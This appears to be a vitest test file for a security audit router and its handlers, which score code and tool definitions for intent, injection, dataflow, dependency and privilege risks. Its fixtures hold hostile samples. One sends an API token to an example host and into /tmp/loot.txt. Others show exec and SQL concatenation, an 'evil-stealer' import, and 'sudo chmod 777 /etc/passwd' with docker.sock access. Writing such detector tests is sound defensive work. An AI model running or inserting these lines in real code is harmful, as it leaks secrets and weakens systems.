import type { SemanticUnit } from './AuditDecomposer.js';
import type { AuditSkillHandler } from './AuditSkillRouter.js';
import { AuditSkillRouter } from './AuditSkillRouter.js';
import {
  DataflowAuditHandler,
  DependencyAuditHandler,
  InjectionAuditHandler,
  IntentAuditHandler,
  PrivilegeAuditHandler
} from './audit-handlers/index.js';

describe('AuditSkillRouter', () => {
  it('routes units to matching handlers only', () => {
    const toolUnit: SemanticUnit = { type: 'tool_definitions', content: '## Tool: test', location: 'body:line:1' };
    const codeUnit: SemanticUnit = { type: 'code_blocks', content: 'const x = 1;', location: 'body:line:10' };

    const intentAnalyze = vi.fn().mockReturnValue({ findings: [], score: 90 });
    const codeAnalyze = vi.fn().mockReturnValue({ findings: [], score: 80 });
    const handlers: AuditSkillHandler[] = [
      { name: 'intent-custom', targetUnits: ['tool_definitions'], analyze: intentAnalyze },
      { name: 'code-custom', targetUnits: ['code_blocks'], analyze: codeAnalyze }
    ];

    const router = new AuditSkillRouter({ handlers });
    const result = router.route([toolUnit, codeUnit]);

    expect(intentAnalyze).toHaveBeenCalledWith([toolUnit]);
    expect(codeAnalyze).toHaveBeenCalledWith([codeUnit]);
    expect(result.score).toBe(85);
  });

  it('merges findings and score from multiple handlers', () => {
    const handlers: AuditSkillHandler[] = [
      {
        name: 'handler-a',
        targetUnits: ['code_blocks'],
        analyze: vi.fn().mockReturnValue({
          findings: [{ auditSkill: 'handler-a', severity: 'medium', message: 'A', unit: 'code_blocks' }],
          score: 70
        })
      },
      {
        name: 'handler-b',
        targetUnits: ['code_blocks'],
        analyze: vi.fn().mockReturnValue({
          findings: [{ auditSkill: 'handler-b', severity: 'high', message: 'B', unit: 'code_blocks' }],
          score: 50
        })
      }
    ];

    const router = new AuditSkillRouter({ handlers });
    const result = router.route([{ type: 'code_blocks', content: 'dangerous()', location: 'body:line:1' }]);

    expect(result.findings).toHaveLength(2);
    expect(result.score).toBe(60);
  });

  it('supports registerHandler and exposes handler names', () => {
    const router = new AuditSkillRouter({ handlers: [] });
    router.registerHandler({
      name: 'runtime-custom',
      targetUnits: ['imports'],
      analyze: () => ({
        findings: [{ auditSkill: 'runtime-custom', severity: 'low', message: 'dynamic import', unit: 'imports' }],
        score: 90
      })
    });

    expect(router.getRegisteredHandlers()).toEqual(['runtime-custom']);
    const result = router.route([{ type: 'imports', content: "import x from 'foo';", location: 'body:line:1' }]);
    expect(result.findings[0]?.auditSkill).toBe('runtime-custom');
  });
});

describe('Built-in audit handlers', () => {
  it('IntentAuditHandler flags suspicious tool intent', () => {
    const handler = new IntentAuditHandler();
    const result = handler.analyze([{ type: 'tool_definitions', content: '### Tool: exploit-shell', location: 'body:line:1' }]);
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.score).toBeLessThan(100);
  });

  it('InjectionAuditHandler detects template and execution injection patterns', () => {
    const handler = new InjectionAuditHandler();
    const result = handler.analyze([
      { type: 'parameter_schemas', content: '{"message":"${payload}"}', location: 'body:line:1' },
      { type: 'code_blocks', content: "const p = exec('ls'); const sql = 'select * from t where id=' + userId;", location: 'body:line:2' }
    ]);
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.score).toBeLessThan(100);
  });

  it('DataflowAuditHandler detects exfiltration and insecure transport', () => {
    const handler = new DataflowAuditHandler();
    const result = handler.analyze([
      {
        type: 'code_blocks',
        content: "const token = process.env.API_TOKEN;\nfetch('http://api.example.com', { headers: { Authorization: token } });\nfs.writeFileSync('/tmp/loot.txt', token);",
        location: 'body:line:1'
      }
    ]);
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.score).toBeLessThan(100);
  });

  it('DependencyAuditHandler flags risky dependency patterns', () => {
    const handler = new DependencyAuditHandler();
    const imports: SemanticUnit[] = Array.from({ length: 21 }, (_v, index) => ({
      type: 'imports',
      content: `import pkg${index} from 'pkg-${index}';`,
      location: `body:line:${index + 1}`
    }));
    imports.push({ type: 'imports', content: "import evil from 'evil-stealer';", location: 'body:line:30' });

    const result = handler.analyze(imports);
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.score).toBeLessThan(100);
  });

  it('PrivilegeAuditHandler flags escalation and escape indicators', () => {
    const handler = new PrivilegeAuditHandler();
    const result = handler.analyze([
      {
        type: 'code_blocks',
        content: 'sudo chmod 777 /etc/passwd\ncat /var/run/docker.sock\nmodprobe loop',
        location: 'body:line:1'
      }
    ]);
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.score).toBeLessThan(100);
  });
});
